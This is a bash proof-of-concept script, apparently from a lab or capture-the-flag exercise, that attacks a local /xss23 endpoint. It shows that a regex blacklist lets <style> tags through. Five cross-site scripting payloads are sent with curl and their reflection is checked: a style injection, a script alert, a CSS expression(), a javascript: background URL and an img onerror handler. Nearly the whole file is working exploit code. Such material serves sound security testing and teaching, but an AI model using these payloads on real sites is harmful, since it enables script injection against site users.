#!/bin/bash

# POC: Style Tag XSS Injection in /xss23 Endpoint
# This script demonstrates how the regex blacklist filter allows <style> tags through
# while blocking other HTML tags, enabling XSS attacks

TARGET_URL="http://localhost:5000/xss23"

echo "=========================================="
echo "Style Tag XSS Vulnerability POC"
echo "=========================================="
echo ""

# Test 1: Basic style tag injection (should pass through)
echo "[*] Test 1: Basic style tag injection"
PAYLOAD1='<style>body{background:red;}</style>'
ENCODED_PAYLOAD1=$(python3 -c "import urllib.parse; print(urllib.parse.quote('''$PAYLOAD1'''))")
echo "[+] Payload: $PAYLOAD1"
echo "[+] Testing: $TARGET_URL?name=$ENCODED_PAYLOAD1"
RESPONSE1=$(curl -s "$TARGET_URL?name=$ENCODED_PAYLOAD1")
if echo "$RESPONSE1" | grep -q "background:red"; then
    echo "[✓] VULNERABLE: Style tag content found in response"
    echo "[✓] Content passed through filter: background:red detected"
else
    echo "[✗] Style tag was filtered"
fi
echo ""

# Test 2: Script tag injection (should be blocked)
echo "[*] Test 2: Script tag injection (baseline - should be blocked)"
PAYLOAD2='<script>alert("xss")</script>'
ENCODED_PAYLOAD2=$(python3 -c "import urllib.parse; print(urllib.parse.quote('''$PAYLOAD2'''))")
echo "[+] Payload: $PAYLOAD2"
echo "[+] Testing: $TARGET_URL?name=$ENCODED_PAYLOAD2"
RESPONSE2=$(curl -s "$TARGET_URL?name=$ENCODED_PAYLOAD2")
if echo "$RESPONSE2" | grep -q "script"; then
    echo "[✗] Script tag not filtered (also vulnerable)"
else
    echo "[✓] Script tag properly filtered"
fi
echo ""

# Test 3: Advanced style tag with event handler simulation
echo "[*] Test 3: Style tag with CSS expression (IE vulnerability)"
PAYLOAD3='<style>body{behavior:expression(alert("xss"))}</style>'
ENCODED_PAYLOAD3=$(python3 -c "import urllib.parse; print(urllib.parse.quote('''$PAYLOAD3'''))")
echo "[+] Payload: $PAYLOAD3"
echo "[+] Testing: $TARGET_URL?name=$ENCODED_PAYLOAD3"
RESPONSE3=$(curl -s "$TARGET_URL?name=$ENCODED_PAYLOAD3")
if echo "$RESPONSE3" | grep -q "behavior:expression"; then
    echo "[✓] VULNERABLE: CSS expression payload passed through"
else
    echo "[✗] CSS expression was filtered"
fi
echo ""

# Test 4: Style tag with background URL
echo "[*] Test 4: Style tag with background URL (alternative vector)"
PAYLOAD4='<style>body{background:url("javascript:alert(1)")}</style>'
ENCODED_PAYLOAD4=$(python3 -c "import urllib.parse; print(urllib.parse.quote('''$PAYLOAD4'''))")
echo "[+] Payload: $PAYLOAD4"
echo "[+] Testing: $TARGET_URL?name=$ENCODED_PAYLOAD4"
RESPONSE4=$(curl -s "$TARGET_URL?name=$ENCODED_PAYLOAD4")
if echo "$RESPONSE4" | grep -q "background:url"; then
    echo "[✓] VULNERABLE: Background URL payload passed through"
else
    echo "[✗] Background URL payload was filtered"
fi
echo ""

# Test 5: Other tags for comparison
echo "[*] Test 5: Img tag injection (comparison - should be blocked)"
PAYLOAD5='<img src=x onerror=alert("xss")>'
ENCODED_PAYLOAD5=$(python3 -c "import urllib.parse; print(urllib.parse.quote('''$PAYLOAD5'''))")
echo "[+] Payload: $PAYLOAD5"
echo "[+] Testing: $TARGET_URL?name=$ENCODED_PAYLOAD5"
RESPONSE5=$(curl -s "$TARGET_URL?name=$ENCODED_PAYLOAD5")
if echo "$RESPONSE5" | grep -q "img"; then
    echo "[✗] Img tag not filtered (vulnerable)"
else
    echo "[✓] Img tag properly filtered"
fi
echo ""

echo "=========================================="
echo "POC Summary"
echo "=========================================="
echo "The regex filter pattern '<(?!style\b)[^>]+>' uses negative lookahead"
echo "to prevent blocking <style> tags while filtering other tags."
echo "This allows injection of malicious style content."
echo "=========================================="